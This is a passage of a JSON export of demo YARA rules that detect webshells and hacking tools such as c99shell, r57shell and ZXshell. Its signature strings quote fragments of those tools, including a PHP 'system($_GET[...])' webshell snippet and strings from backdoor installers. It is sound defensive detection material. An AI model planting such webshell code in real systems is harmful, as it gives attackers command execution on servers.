\"__vbaExceptHandler\" \n      $s4 = \"EVENT_SINK_Release\" \n      $s8 = \"__vbaErrorOverflow\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:58:21","description":"Webshells Auto-generated - file peek-a-boo.exe","minimum_yara":"1.7","name":"HKTL_peek_a_boo_RID2CA7","reference":"-","required_modules":[],"rule_hash":"a500511b6f373c3d36c4c013b2e09026","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_fmlibraryv3_RID2F17 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file fmlibraryv3.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:42:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"ExeNewRs.CommandText = \\\"UPDATE \\\" & tablename & \\\" SET \\\" & ExeNewRsValues & \\\" WHER\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:42:21","description":"Webshells Auto-generated - file fmlibraryv3.asp","minimum_yara":"1.7","name":"Webshell_fmlibraryv3_RID2F17","reference":"-","required_modules":[],"rule_hash":"d424ffff5da3ebb326aac25dc839b070","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_Debug_dllTest_2_RID2E56 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file dllTest.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:10:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"\\\\Debug\\\\dllTest.pdb\" \n      $s5 = \"--list the services in the computer\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:10:11","description":"Webshells Auto-generated - file dllTest.dll","minimum_yara":"1.7","name":"HKTL_Debug_dllTest_2_RID2E56","reference":"-","required_modules":[],"rule_hash":"183ad1a70b017fb8403a0ad6b2c99830","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_connector_ASP_RID2FB4 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file connector.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:08:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"If ( AttackID = BROADCAST_ATTACK )\" \n      $s4 = \"Add UNIQUE ID for victims / zombies\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:08:31","description":"Webshells Auto-generated - file connector.asp","minimum_yara":"1.7","name":"Webshell_connector_ASP_RID2FB4","reference":"-","required_modules":[],"rule_hash":"149bda77d8b676f5f935255723e5456b","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_shelltools_g0t_root_HideRun_RID3387 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file HideRun.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Usage -- hiderun [AppName]\" \n      $s7 = \"PVAX SW, Alexey A. Popoff, Moscow, 1997.\" \n   condition: \n      all of them\n}","date":"2014-04-07 14:51:41","description":"Webshells Auto-generated - file HideRun.exe","minimum_yara":"1.7","name":"HKTL_shelltools_g0t_root_HideRun_RID3387","reference":"-","required_modules":[],"rule_hash":"120316ce56132d4a69a362f39d8edff0","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_PHP_Shell_v1_7_RID2F81 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file PHP_Shell_v1.7.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:00:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:00:01","description":"Webshells Auto-generated - file PHP_Shell_v1.7.php","minimum_yara":"1.7","name":"Webshell_PHP_Shell_v1_7_RID2F81","reference":"-","required_modules":[],"rule_hash":"4399cb043cee4ec15d754eee6766f8d1","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_xssshell_save_RID302A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file save.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:28:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID\" \n      $s5 = \"VictimID = fm_NStr(Victims(i))\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:28:11","description":"Webshells Auto-generated - file save.asp","minimum_yara":"1.7","name":"Webshell_xssshell_save_RID302A","reference":"-","required_modules":[],"rule_hash":"b2961c05d0b8e8f614e4139c0d5710ad","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_screencap_RID2C57 : DEMO HKTL T1100 T1113 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file screencap.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, T1113, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"GetDIBColorTable\" \n      $s1 = \"Screen.bmp\" \n      $s2 = \"CreateDCA\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:45:01","description":"Webshells Auto-generated - file screencap.exe","minimum_yara":"1.7","name":"HKTL_screencap_RID2C57","reference":"-","required_modules":[],"rule_hash":"a76ba0244b2433fcd30b75443deacc80","score":75,"tags":["T1100","DEMO","WEBSHELL","T1113","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_phpinj_2_RID2FD9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phpinj.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s9 = \"<? system(\\\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:14:41","description":"Webshells Auto-generated - file phpinj.php","minimum_yara":"1.7","name":"Webshell_FSO_s_phpinj_2_RID2FD9","reference":"-","required_modules":[],"rule_hash":"22a68d5205873da411447139bcfa414b","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_ZXshell2_0_rar_Folder_zxrecv_RID338E : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file zxrecv.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:52:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"RyFlushBuff\" \n      $s1 = \"teToWideChar^FiYP\" \n      $s2 = \"mdesc+8F D\" \n      $s3 = \"\\\\von76std\" \n      $s4 = \"5pur+virtul\" \n      $s5 = \"- Kablto io\" \n      $s6 = \"ac#f{lowi8a\" \n   condition: \n      all of them\n}","date":"2014-04-07 14:52:51","description":"Webshells Auto-generated - file zxrecv.exe","minimum_yara":"1.7","name":"HKTL_ZXshell2_0_rar_Folder_zxrecv_RID338E","reference":"-","required_modules":[],"rule_hash":"3ef71ed450d328d9e0feea55e66045f8","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_ajan_RID2E59 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file ajan.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:10:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"entrika.write \\\"BinaryStream.SaveToFile\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:10:41","description":"Webshells Auto-generated - file ajan.asp","minimum_yara":"1.7","name":"Webshell_FSO_s_ajan_RID2E59","reference":"-","required_modules":[],"rule_hash":"e7426d96d66ebf4a407fc0b1c2ab77a9","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99shell_RID2D93 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file c99shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:37:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\\\\\"uploadurl\\\\\\\"&nbsp;type=\\\\\\\"text\\\\\\\"&\" \n   condition: \n      all of them\n}","date":"2014-04-07 10:37:41","description":"Webshells Auto-generated - file c99shell.php","minimum_yara":"1.7","name":"Webshell_c99shell_RID2D93","reference":"-","required_modules":[],"rule_hash":"dfc4b5028a0d1956096a17f8d171a24e","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_phpspy_2005_full_RID3082 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phpspy_2005_full.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:42:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"echo \\\"  <td align=\\\\\\\"center\\\\\\\" nowrap valign=\\\\\\\"top\\\\\\\"><a href=\\\\\\\"?downfile=\\\".urlenco\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:42:51","description":"Webshells Auto-generated - file phpspy_2005_full.php","minimum_yara":"1.7","name":"Webshell_phpspy_2005_full_RID3082","reference":"-","required_modules":[],"rule_hash":"7608eac06b29f3bf023404247788aa4e","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_zehir4_2_RID2FA6 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file zehir4.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:06:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"\\\"Program Files\\\\Serv-u\\\\Serv\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:06:11","description":"Webshells Auto-generated - file zehir4.asp","minimum_yara":"1.7","name":"Webshell_FSO_s_zehir4_2_RID2FA6","reference":"-","required_modules":[],"rule_hash":"6a7beb2c0020f4eac967494afcb84283","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_indexer_2_RID303F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file indexer.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"<td>Nerden :<td><input type=\\\"text\\\" name=\\\"nerden\\\" size=25 value=index.html></td>\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:31:41","description":"Webshells Auto-generated - file indexer.asp","minimum_yara":"1.7","name":"Webshell_FSO_s_indexer_2_RID303F","reference":"-","required_modules":[],"rule_hash":"c4febcd3a72c61ff09c0bb155ab5bc13","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_HYTop_DevPack_2005_RID309D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2005.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:47:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\\\"/\\\")),\\\"\\\")\" \n      $s8 = \"scrollbar-darkshadow-color:#9C9CD3;\" \n      $s9 = \"scrollbar-face-color:#E4E4F3;\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:47:21","description":"Webshells Auto-generated - file 2005.asp","minimum_yara":"1.7","name":"Webshell_HYTop_DevPack_2005_RID309D","reference":"-","required_modules":[],"rule_hash":"748922ce8621e44385d2fef31f67e551","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_root_040_zip_Folder_deploy_RID32B3 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file deploy.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:16:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"halon synscan 127.0.0.1 1-65536\" \n      $s8 = \"Obviously you replace the ip address with that of the target.\" \n   condition: \n      all of them\n}","date":"2014-04-07 14:16:21","description":"Webshells Auto-generated - file deploy.exe","minimum_yara":"1.7","name":"HKTL_root_040_zip_Folder_deploy_RID32B3","reference":"-","required_modules":[],"rule_hash":"6b9600be33255412e22b78c54fefd5c5","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_by063cli_RID2B4F : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file by063cli.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:01:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"#popmsghello,are you all right?\" \n      $s4 = \"connect failed,check your network and remote ip.\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:01:01","description":"Webshells Auto-generated - file by063cli.exe","minimum_yara":"1.7","name":"HKTL_by063cli_RID2B4F","reference":"-","required_modules":[],"rule_hash":"4450a07a34acc926d52c2cb32fcc74fc","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_byshell063_ntboot_2_RID2FB5 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file ntboot.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:08:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:08:41","description":"Webshells Auto-generated - file ntboot.dll","minimum_yara":"1.7","name":"HKTL_byshell063_ntboot_2_RID2FB5","reference":"-","required_modules":[],"rule_hash":"df39b15b0694565ccc0d6f050e6b3876","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_u_uay_RID2AC6 : DEMO HKTL T1050 T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file uay.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 08:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1050, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"exec \\\"c:\\\\WINDOWS\\\\System32\\\\freecell.exe\" \n      $s9 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\uay.sys\\\\Security\" \n   condition: \n      1 of them\n}","date":"2014-04-07 08:21:41","description":"Webshells Auto-generated - file uay.exe","minimum_yara":"1.7","name":"HKTL_u_uay_RID2AC6","reference":"-","required_modules":[],"rule_hash":"56334026e41589dbfc413f90cbee100e","score":75,"tags":["T1100","DEMO","WEBSHELL","T1050","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_pwreveal_RID2C09 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file pwreveal.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"*<Blank - no es\" \n      $s3 = \"JDiamondCS \" \n      $s8 = \"sword set> [Leith=0 bytes]\" \n      $s9 = \"ION\\\\System\\\\Floating-\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:32:01","description":"Webshells Auto-generated - file pwreveal.exe","minimum_yara":"1.7","name":"HKTL_pwreveal_RID2C09","reference":"-","required_modules":[],"rule_hash":"ca8c8baa39a5215b66a9eaf1f0e2bc8c","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_vanquish_2_RID2CA3 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file vanquish.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:57:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Vanquish - DLL injection failed:\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:57:41","description":"Webshells Auto-generated - file vanquish.exe","minimum_yara":"1.7","name":"HKTL_vanquish_2_RID2CA3","reference":"-","required_modules":[],"rule_hash":"abd86a8bb6422e31452b2dad7a55b600","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_down_rar_Folder_down_RID32D4 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file down.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:21:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"response.write \\\"<font color=blue size=2>NetBios Name: \\\\\\\\\\\"  & Snet.ComputerName &\" \n   condition: \n      all of them\n}","date":"2014-04-07 14:21:51","description":"Webshells Auto-generated - file down.asp","minimum_yara":"1.7","name":"Webshell_down_rar_Folder_down_RID32D4","reference":"-","required_modules":[],"rule_hash":"ae84061906bf1f6aad4485136c2ac196","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_cmdShell_ASP_RID2F15 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file cmdShell.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if cmdPath=\\\"wscriptShell\\\" then\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:42:01","description":"Webshells Auto-generated - file cmdShell.asp","minimum_yara":"1.7","name":"Webshell_cmdShell_ASP_RID2F15","reference":"-","required_modules":[],"rule_hash":"9bde77119c4f40302e7489199b74e2d8","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_portlessinst_RID2DDD : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file portlessinst.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:50:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Fail To Open Registry\" \n      $s3 = \"f<-WLEggDr\\\"\" \n      $s6 = \"oMemoryCreateP\" \n   condition: \n      all of them\n}","date":"2014-04-07 10:50:01","description":"Webshells Auto-generated - file portlessinst.exe","minimum_yara":"1.7","name":"HKTL_portlessinst_RID2DDD","reference":"-","required_modules":[],"rule_hash":"949324e3547a81565aebbb303cb68e6d","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_SetupBDoor_RID2C8A : DEMO HKTL MAL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file SetupBDoor.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, MAL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\BDoor\\\\SetupBDoor\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:53:31","description":"Webshells Auto-generated - file SetupBDoor.exe","minimum_yara":"1.7","name":"HKTL_SetupBDoor_RID2C8A","reference":"-","required_modules":[],"rule_hash":"9e1512124f625c40e2aa0f65fb0eddcc","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL","MAL"]},{"author":"Florian Roth","content":"rule Webshell_phpshell_3_RID2E98 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phpshell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"<input name=\\\"submit_btn\\\" type=\\\"submit\\\" value=\\\"Execute Command\\\"></p>\" \n      $s5 = \"      echo \\\"<option value=\\\\\\\"$work_dir\\\\\\\" selected>Current Directory</option>\\\\n\\\";\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:21:11","description":"Webshells Auto-generated - file phpshell.php","minimum_yara":"1.7","name":"Webshell_phpshell_3_RID2E98","reference":"-","required_modules":[],"rule_hash":"0c60c8ef00859867686346f3aa400966","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_BIN_Server_RID2C52 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file Server.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:44:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"configserver\" \n      $s1 = \"GetLogicalDrives\" \n      $s2 = \"WinExec\" \n      $s4 = \"fxftest\" \n      $s5 = \"upfileok\" \n      $s7 = \"upfileer\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:44:11","description":"Webshells Auto-generated - file Server.exe","minimum_yara":"1.7","name":"HKTL_BIN_Server_RID2C52","reference":"-","required_modules":[],"rule_hash":"ff54c9b589e2004f77543d679f32364a","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_HYTop2006_rar_Folder_2006_RID32C8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2006.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:19:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"strBackDoor = strBackDoor \" \n   condition: \n      all of them\n}","date":"2014-04-07 14:19:51","description":"Webshells Auto-generated - file 2006.asp","minimum_yara":"1.7","name":"Webshell_HYTop2006_rar_Folder_2006_RID32C8","reference":"-","required_modules":[],"rule_hash":"da24bab15e1377bca46e329bfb75bc09","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r57shell_3_RID2E2E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file r57shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:03:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<b>\\\".$_POST['cmd']\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:03:31","description":"Webshells Auto-generated - file r57shell.php","minimum_yara":"1.7","name":"Webshell_r57shell_3_RID2E2E","reference":"-","required_modules":[],"rule_hash":"c48e6dbb726c1b6f21416caa9c698621","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_ajan_2_RID2EEA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file ajan.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:34:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"\\\"Set WshShell = CreateObject(\\\"\\\"WScript.Shell\\\"\\\")\" \n      $s3 = \"/file.zip\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:34:51","description":"Webshells Auto-generated - file ajan.asp","minimum_yara":"1.7","name":"Webshell_FSO_s_ajan_2_RID2EEA","reference":"-","required_modules":[],"rule_hash":"4fa422008a2c56c6ebd3c690d98a404b","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_HDConfig_RID2B85 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file HDConfig.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:10:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"An encryption key is derived from the password hash. \" \n      $s3 = \"A hash object has been created. \" \n      $s4 = \"Error during 